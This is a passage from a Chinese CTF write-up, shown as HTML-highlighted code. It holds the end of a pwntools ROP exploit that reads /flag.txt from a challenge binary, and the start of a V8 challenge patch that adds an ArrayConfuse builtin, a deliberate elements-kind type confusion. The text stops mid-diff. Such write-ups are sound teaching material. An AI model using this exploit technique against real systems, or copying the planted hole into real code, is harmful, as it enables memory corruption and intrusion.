pop_rdx_rbx_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 4</span><span style="color:#999999">,</span><span style="color:#2F798A"> 4</span><span style="color:#999999">,</span><span style="color:#393A34"> syscall</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 5</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rsi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> ans</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdx_rbx_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">30</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> elf</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#a65e2b">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">read</span><span style="color:#B5695977">'</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rsi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> ans</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdx_rbx_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">30</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> elf</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#a65e2b">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">write</span><span style="color:#B5695977">'</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/flag.txt</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./chal</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">127.0.0.1</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 9000</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">b *0x4019a3</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">pop_rdi_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000040204f</span><br><span style="color:#DBD7CAEE">pop_rsi_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000040a0be</span><br><span style="color:#DBD7CAEE">pop_rdx_rbx_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000048630b</span><br><span style="color:#DBD7CAEE">pop_rax_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">0000000000450507</span><br><span style="color:#DBD7CAEE">syscall </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">0000000044EF59</span><br><span style="color:#DBD7CAEE">flag </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">4CA8E0</span><br><span style="color:#DBD7CAEE">ans </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">4CA900</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 128</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">b</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 8</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rsi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flag</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdx_rbx_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">30</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#d4976c">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">read</span><span style="color:#C98A7D77">'</span><span style="color:#d4976c">]</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flag</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rax_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rsi_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 4</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdx_rbx_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 4</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 4</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> syscall</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 5</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rsi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> ans</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdx_rbx_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">30</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#d4976c">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">read</span><span style="color:#C98A7D77">'</span><span style="color:#d4976c">]</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rsi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> ans</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdx_rbx_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">30</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#d4976c">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">write</span><span style="color:#C98A7D77">'</span><span style="color:#d4976c">]</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/flag.txt</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="e-crop-part-2" class="scroll-target"><a href="#e-crop-part-2"><code class="hash inline-code">#</code>E-Crop part 2</a></h2>
<p><del>chrome v8，学完来打。</del></p>
<p>学完了，开打。</p>
<p>先看一下 patch：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-diff language-diff"><span style="color:#005CC5">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span style="color:#393A34">index ea45a7ada6b..3af3bea5725 100644</span><br><span style="color:#999999">---</span><span style="color:#B31D28"> a/src/builtins/builtins-array.cc</span><br><span style="color:#999999">+++</span><span style="color:#22863A"> b/src/builtins/builtins-array.cc</span><br><span style="color:#999999;font-weight:bold">@@</span><span style="color:#6F42C1;font-weight:bold"> -1589,5 +1589,44 </span><span style="color:#999999;font-weight:bold">@@</span><span style="color:#393A34"> BUILTIN</span><span style="color:#2993a3">(</span><span style="color:#393A34">ArrayConcat</span><span style="color:#2993a3">)</span><span style="color:#393A34"> </span><span style="color:#2993a3">{</span><br><span style="color:#393A34">   return Slow_ArrayConcat</span><span style="color:#1e754f">(</span><span style="color:#393A34">&#x26;args, species, isolate</span><span style="color:#1e754f">)</span><span style="color:#393A34">;</span><br><span style="color:#393A34"> </span><span style="color:#2993a3">}</span><br><br><span style="color:#22863A">+// Custom Additions </span><span style="color:#2993a3">(</span><span style="color:#22863A">UTCTF</span><span style="color:#2993a3">)</span><br><span style="color:#22863A">+</span><br><span style="color:#22863A">+BUILTIN</span><span style="color:#2993a3">(</span><span style="color:#22863A">ArrayConfuse</span><span style="color:#2993a3">)</span><span style="color:#22863A"> </span><span style="color:#2993a3">{</span><br><span style="color:#22863A">+  HandleScope scope</span><span style="color:#1e754f">(</span><span style="color:#22863A">isolate</span><span style="color:#1e754f">)</span><span style="color:#22863A">;</span><br><span style="color:#22863A">+  Factory *factory = isolate-</span><span style="color:#22863A">></span><span style="color:#22863A">factory</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#22863A">;</span><br><span style="color:#22863A">+  Handle</span><span style="color:#22863A">&#x3C;</span><span style="color:#22863A">Object</span><span style="color:#22863A">></span><span style="color:#22863A"> receiver = args.receiver</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#22863A">;</span><br><span style="color:#22863A">+</span><br><span style="color:#22863A">+  if </span><span style="color:#1e754f">(</span><span style="color:#22863A">!IsJSArray</span><span style="color:#a65e2b">(</span><span style="color:#22863A">*receiver</span><span style="color:#a65e2b">)</span><span style="color:#22863A"> || !HasOnlySimpleReceiverElements</span><span style="color:#a65e2b">(</span><span style="color:#22863A">isolate, Cast</span><span style="color:#22863A">&#x3C;</span><span style="color:#22863A">JSArray</span><span style="color:#22863A">></span><span style="color:#a13865">(</span><span style="color:#22863A">*receiver</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#22863A"> </span><span style="color:#1e754f">{</span><br><span style="color:#22863A">+    THROW_NEW_ERROR_RETURN_FAILURE</span><span style="color:#a65e2b">(</span><span style="color:#22863A">isolate, NewTypeError</span><span style="color:#a13865">(</span><span style="color:#22863A">MessageTemplate::kPlaceholderOnly,</span><br><span style="color:#22863A">+      factory-</span><span style="color:#22863A">></span><span style="color:#22863A">NewStringFromAsciiChecked</span><span style="color:#bda437">(</span><span style="color:#22863A">"Invalid type. Must be a JSArray."</span><span style="color:#bda437">)</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#22863A">;</span><br><span style="color:#22863A">+  </span><span style="color:#1e754f">}</span><br><span style="color:#22863A">+</span><br><span style="color:#22863A">+  Handle</span><span style="color:#22863A">&#x3C;</span><span style="color:#22863A">JSArray</span><span style="color:#22863A">></span><span style="color:#22863A"> array = Cast</span><span style="color:#22863A">&#x3C;</span><span style="color:#22863A">JSArray</span><span style="color:#22863A">></span><span style="color:#1e754f">(</span><span style="color:#22863A">receiver</span><span style="color:#1e754f">)</span><span style="color:#22863A">;</span><br><span style="color:#22863A">+  ElementsKind kind = array-</span><span style="color:#22863A">></span><span style="color:#22863A">GetElementsKind</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#22863A">;</span><br><span style="color:#22863A">+</span><br><span style="color:#22863A">+  if </span><span style="color:#1e754f">(</span><span style="color:#22863A">kind == PACKED_ELEMENTS</span><span style="color:#1e754f">)</span><span style="color:#22863A"> </span><span style="color:#1e754f">{</span><br><span style="color:#22863A">+    DirectHandle</span><span style="color:#22863A">&#x3C;</span><span style="color:#22863A">Map</span><span style="color:#22863A">></span><span style="color:#22863A"> map = JSObject::GetElementsTransitionMap</span><span style="color:#a65e2b">(</span><br><span style="color:#22863A">+        array, PACKED_DOUBLE_ELEMENTS</span><span style="color:#a65e2b">)</span><span style="color:#22863A">;</span><br><span style="color:#22863A">+    </span><span style="color:#a65e2b">{</span><br><span style="color:#22863A">+      DisallowGarbageCollection no_gc;</span><br><span style="color:#22863A">+      Tagged</span><span style="color:#22863A">&#x3C;</span><span style="color:#22863A">JSArray</span><span style="color:#22863A">></span><span style="color:#22863A"> raw = *array;</span><br><span style="color:#22863A">+      raw-</span><span style="color:#22863A">></span><span style="color:#22863A">set_map</span><span style="color:#a13865">(</span><span style="color:#22863A">*map, kReleaseStore</span><span style="color:#a13865">)</span><span style="color:#22863A">;</span><br><span style="color:#22863A">+    </span><span style="color:#a65e2b">}</span><br><span style="color:#22863A">+  </span><span style="color:#1e754f">}</span><span style="color:#22863A"> else if </span><span style="color:#1e754f">(</span><span style="color:#22863A">kind == PACKED_DOUBLE_ELEMENTS</span><span style="color:#1e754f">)</span><span style="color:#22863A"> </span><span style="color:#1e754f">{</span><br><span style="color:#22863A">+    DirectHandle</span><span style="color:#22863A">&#x3C;</span><span style="color:#22863A">Map</span><span style="color:#22863A">></span><span style="color:#22863A"> map = JSObject::GetElementsTransitionMap</span><span style="color:#a65e2b">(</span><br><span style="color:#22863A">+        array, PACKED_ELEMENTS</span><span style="color:#a65e2b">)</span><span style="color:#22863A">;</span><br><span style="color:#22863A">+    </span><span style="color:#a65e2b">{</span><br><span style="color:#22863A">+      DisallowGarbageCollection no_gc;</span><br><span style="color:#22863A">+      Tagged</span><span style="color:#22863A">&#x3C;</span><span style="color:#22863A">JSArray</span><span style="color:#22863A">></span><span style="color:#22863A"> raw = *array;</span><br><span style="color:#22863A">+      raw-</span><span style="color:#22863A">></span><span style="color:#22863A">set_map</span><span style="color:#a13865">(</span><span style="color:#22863A">*map, kReleaseStore</span><span style="color:#a13865">)</span><span style="color:#22863A">;</span><br><span style="color:#22863A">+    </span><span style="color:#a65e2b">}</span><br><span style="color:#22863A">+  </span><span style="color:#1e754f">}</span><span style="color:#22863A"> else </span><span style="color:#1e754f">{</span><br><span style="color:#22863A">+    THROW_NEW_ERROR_RETURN_FAILURE</span><span style="color:#a65e2b">(</span><span style="color:#22863A">isolate, NewTypeError</span><span style="color:#a13865">(</span><span style="color:#22863A">MessageTemplate::kPlaceholderOnly,</span><br><span style="color:#22863A">+      factory-</span><span style="color:#22863A">></span><span style="color:#22863A">NewStringFromAsciiChecked</span><span style="color:#bda437">(</span><span style="color:#22863A">"Invalid JSArray type. Must be an object or float array."</span><span style="color:#bda437">)</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#22863A">;</span><br><span style="color:#22863A">+  </span><span style="color:#1e754f">}</span><br><span style="color:#22863A">+</span><br><span style="color:#22863A">+  return ReadOnlyRoots</span><span style="color:#1e754f">(</span><span style="color:#22863A">isolate</span><span style="color:#1e754f">)</span><span style="color:#22863A">.undefined_value</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#22863A">;</span><br><span style="color:#22863A">+</span><span style="color:#2993a3">}</span><br><span style="color:#22863A">+</span><br><span style="color:#393A34"> </span><span style="color:rgba(255, 18, 18, 0.8)">}</span><span style="color:#393A34">  // namespace internal</span><br><span style="color:#393A34"> </span><span style="color:rgba(255, 18, 18, 0.8)">}</span><span style="color:#393A34">  // namespace v8</span><br><span style="color:#005CC5">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span><br><span style="color:#393A34">index 78cbf8874ed..872db196d15 100644</span><br><span style="color:#999999">---</span><span style="color:#B31D28"> a/src/builtins/builtins-definitions.h</span><br><span style="color:#999999">+++</span><span style="color:#22863A"> b/src/builtins/builtins-definitions.h</span><br><span style="color:#999999;font-weight:bold">@@</span><span style="color:#6F42C1;font-weight:bold"> -426,6 +426,8 </span><span style="color:#999999;font-weight:bold">@@</span><span style="color:#393A34"> namespace internal </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#393A34">   CPP</span><span style="color:#1e754f">(</span><span style="color:#393A34">ArrayShift</span><span style="color:#1e754f">)</span><span style="color:#393A34">                                                              \</span><br><span style="color:#393A34">   /* ES6 #sec-array.prototype.unshift */                                       \</span><br><span style="color:#393A34">   CPP</span><span style="color:#1e754f">(</span><span style="color:#393A34">ArrayUnshift</span><span style="color:#1e754f">)</span><span style="color:#393A34">                                                            \</span><br><span style="color:#22863A">+  /* Custom Additions </span><span style="color:#1e754f">(</span><span style="color:#22863A">UTCTF</span><span style="color:#1e754f">)</span><span style="color:#22863A"> */                                               \</span><br><span style="color:#22863A">+  CPP</span><span style="color:#1e754f">(</span><span style="color:#22863A">ArrayConfuse</span><span style="color:#1e754f">)</span><span style="color:#22863A">                                                            \</span><br><span style="color:#393A34">   /* Support for Array.from and other array-copying idioms */                  \</span><br><span style="color:#393A34">   TFS</span><span style="color:#1e754f">(</span><span style="color:#393A34">CloneFastJSArray, NeedsContext::kYes, kSource</span><span style="color:#1e754f">)</span><span style="color:#393A34">                           \</span><br><span style="color:#393A34">   TFS</span><span style="color:#1e754f">(</span><span style="color:#393A34">CloneFastJSArrayFillingHoles, NeedsContext::kYes, kSource</span><span style="color:#1e754f">)</span><span style="color:#393A34">               \</span><br><span style="color:#005CC5">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span style="color:#393A34">index 9a346d134b9..99a2bc95944 100644</span><br><span style="color:#999999">---</span><span style="color:#B31D28"> a/src/compiler/typer.cc</span><br><span style="color:#999999">+++</span><span style="color:#22863A"> b/src/compiler/typer.cc</span><br><span style="color:#999999;font-weight:bold">@@</span><span style="color:#6F42C1;font-weight:bold"> -1937,6 +1937,9 </span><span style="color:#999999;font-weight:bold">@@</span><span style="color:#393A34"> Type Typer::Visitor::JSCallTyper</span><span style="color:#1e754f">(</span><span style="color:#393A34">Type fun, Typer* t</span><span style="color:#1e754f">)</span><span style="color:#393A34"> </span><span style="color:#1e754f">{</span><br><span style="color:#393A34">       return Type::Receiver</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#393A34">;</span><br><span style="color:#393A34">     case Builtin::kArrayUnshift:</span><br><span style="color:#393A34">       return t-</span><span style="color:#393A34">></span><span style="color:#393A34">cache_-</span><span style="color:#393A34">></span><span style="color:#393A34">kPositiveSafeInteger;</span><br><span style="color:#22863A">+    // Custom Additions </span><span style="color:#a65e2b">(</span><span style="color:#22863A">UTCTF</span><span style="color:#a65e2b">)</span><br><span style="color:#22863A">+    case Builtin::kArrayConfuse:</span><br><span style="color:#22863A">+      return Type::Undefined</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#22863A">;</span><br><br><span style="color:#393A34">     // ArrayBuffer functions.</span><br><span style="color:#393A34">     case Builtin::kArrayBufferIsView:</span><br><span style="color:#005CC5">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span><br><span style="color:#393A34">index facf0d86d79..95340facaad 100644</span><br><span style="color:#999999">---</span><span style="color:#B31D28"> a/src/d8/d8.cc</span><br><span style="color:#999999">+++</span><span style="color:#22863A"> b/src/d8/d8.cc</span><br><span style="color:#999999;font-weight:bold">@@</span><span style="color:#6F42C1;font-weight:bold"> -3364,53 +3364,10 </span><span style="color:#999999;font-weight:bold">@@</span><span style="color:#393A34"> Local</span><span style="color:#393A34">&#x3C;</span><span style="color:#393A34">FunctionTemplate</span><span style="color:#393A34">></span><span style="color:#393A34"> Shell::CreateNodeTemplates</span><span style="color:rgba(255, 18, 18, 0.8)">(</span><br><br><span style="color:#393A34"> Local</span><span style="color:#393A34">&#x3C;</span><span style="color:#393A34">ObjectTemplate</span><span style="color:#393A34">></span><span style="color:#393A34"> Shell::CreateGlobalTemplate</span><span style="color:#a13865">(</span><span style="color:#393A34">Isolate* isolate</span><span style="color:#a13865">)</span><span style="color:#393A34"> </span><span style="color:#a13865">{</span><br><span style="color:#393A34">   Local</span><span style="color:#393A34">&#x3C;</span><span style="color:#393A34">ObjectTemplate</span><span style="color:#393A34">></span><span style="color:#393A34"> global_template = ObjectTemplate::New</span><span style="color:#bda437">(</span><span style="color:#393A34">isolate</span><span style="color:#bda437">)</span><span style="color:#393A34">;</span><br><span style="color:#B31D28">-  global_template-</span><span style="color:#B31D28">></span><span style="color:#B31D28">Set</span><span style="color:#bda437">(</span><span style="color:#B31D28">Symbol::GetToStringTag</span><span style="color:#296aa3">(</span><span style="color:#B31D28">isolate</span><span style="color:#296aa3">)</span><span style="color:#B31D28">,</span><br><span style="color:#B31D28">-                       String::NewFromUtf8Literal</span><span style="color:#296aa3">(</span><span style="color:#B31D28">isolate, "global"</span><span style="color:#296aa3">)</span><span style="color:#bda437">)</span><span style="color:#B31D28">;</span><br><span style="color:#393A34">   global_template-</span><span style="color:#393A34">></span><span style="color:#393A34">Set</span><span style="color:#bda437">(</span><span style="color:#393A34">isolate, "version",</span><br><span style="color:#393A34">                        FunctionTemplate::New</span><span style="color:#296aa3">(</span><span style="color:#393A34">isolate, Version</span><span style="color:#296aa3">)</span><span style="color:#bda437">)</span><span style="color:#393A34">;</span><br><br><span style="color:#393A34">   global_template-</span><span style="color:#393A34">></span><span style="color:#393A34">Set</span><span style="color:#bda437">(</span><span style="color:#393A34">isolate, "print", FunctionTemplate::New</span><span style="color:#296aa3">(</span><span style="color:#393A34">isolate, Print</span><span style="color:#296aa3">)</span><span style="color:#bda437">)</span><span style="color:#393A34">;</span><br><span style="color:#B31D28">-  global_template-</span><span style="color:#B31D28">></span><span style="color:#B31D28">Set</span><span style="color:#bda437">(</span><span style="color:#B31D28">isolate, "printErr",</span><br><span style="color:#B31D28">-                       FunctionTemplate::New</span><span style="color:#296aa3">(</span><span style="color:#B31D28">isolate, PrintErr</span><span style="color:#296aa3">)</span><span style="color:#bda437">)</span><span style="color:#B31D28">;</span><br><span style="color:#B31D28">-  global_template-</span><span style="color:#B31D28">></span><span style="color:#B31D28">Set</span><span style="color:#bda437">(</span><span style="color:#B31D28">isolate, "write",</span><br><span style="color:#B31D28">-                       FunctionTemplate::New</span><span style="color:#296aa3">(</span><span style="color:#B31D28">isolate, WriteStdout</span><span style="color:#296aa3">)</span><span style="color:#bda437">)</span><span style="color:#B31D28">;</span><br><span style="color:#B31D28">-  if </span><span style="color:#bda437">(</span><span style="color:#B31D28">!i::v8_flags.fuzzing</span><span style="color:#bda437">)</span><span style="color:#B31D28"> </span><span style="color:#bda437">{</span><br><span style="color:#B31D28">-    global_template-</span><span style="color:#B31D28">></span><span style="color:#B31D28">Set</span><span style="color:#296aa3">(</span><span style="color:#B31D28">isolate, "writeFile",</span><br><span style="color:#B31D28">-                         FunctionTemplate::New</span><span style="color:#2993a3">(</span><span style="color:#B31D28">isolate, WriteFile</span><span style="color:#2993a3">)</span><span style="color:#296aa3">)</span><span style="color:#B31D28">;</span><br><span style="color:#B31D28">-  </span><span style="color:#bda437">}</span><br><span style="color:#B31D28">-  global_template-</span><span style="color:#B31D28">></span><span style="color:#B31D28">Set</span><span style="color:#bda437">(</span><span style="color:#B31D28">isolate, "read",</span><br><span style="color:#B31D28">-                       FunctionTemplate::New</span><span style="color:#296aa3">(</span><span style="color:#B31D28">isolate, ReadFile</span><span style="color:#296aa3">)</span><span style="color:#bda437">)</span><span style="color:#B31D28">;</span><br><span style="color:#B31D28">-  global_template-</span><span style="color:#B31D28">></span><span style="color:#B31D28">Set</span><span style="color:#bda437">(</span><span style="color:#B31D28">isolate, "readbuffer",</span><br><span style="color:#B31D28">-                       FunctionTemplate::New</span><span style="color:#296aa3">(</span><span style="color:#B31D28">isolate, ReadBuffer</span><span style="color:#296aa3">)</span><span style="color:#bda437">)</span><span style="color:#B31D28">;</span><br><span style="color:#B31D28">-  global_template-</span><span style="color:#B31D28">></span><span style="color:#B31D28">Set</span><span style="color:#bda437">(</span><span style="color:#B31D28">isolate, "readline",</span><br><span style="color:#B31D28">-                       FunctionTemplate::New</span><span style="color:#296aa3">(</span><span style="color:#B31D28">isolate, ReadLine</span><span style="color:#296aa3">)</span><span style="color:#bda437">)</span><span style="color:#B31D28">;</span><br><span style="color:#B31D28">-  global_template-</span><span style="color:#B31D28">></span><span style="color:#B31D28">Set</span><span style="color:#bda437">(</span><span style="color:#B31D28">isolate, "load",</span><br><span style="color:#B31D28">-                       FunctionTemplate::New</span><span style="color:#296aa3">(</span><span style="color:#B31D28">isolate, ExecuteFile</span><span style="color:#296aa3">)</span><span style="color:#bda437">)</span><span style="color:#B31D28">;</span><br><span style="color:#B31D28">-  global_template-</span><span style="color:#B31D28">></span><span style="color:#B31D28">Set</span><span style="color:#bda437">(</span><span style="color:#B31D28">isolate, "setTimeout",</span><br><span style="color:#B31D28">-                       FunctionTemplate::New</span><span style="color:#296aa3">(</span><span style="color:#B31D28">isolate, SetTimeout</span><span style="color:#296aa3">)</span><span style="color:#bda437">)</span><span 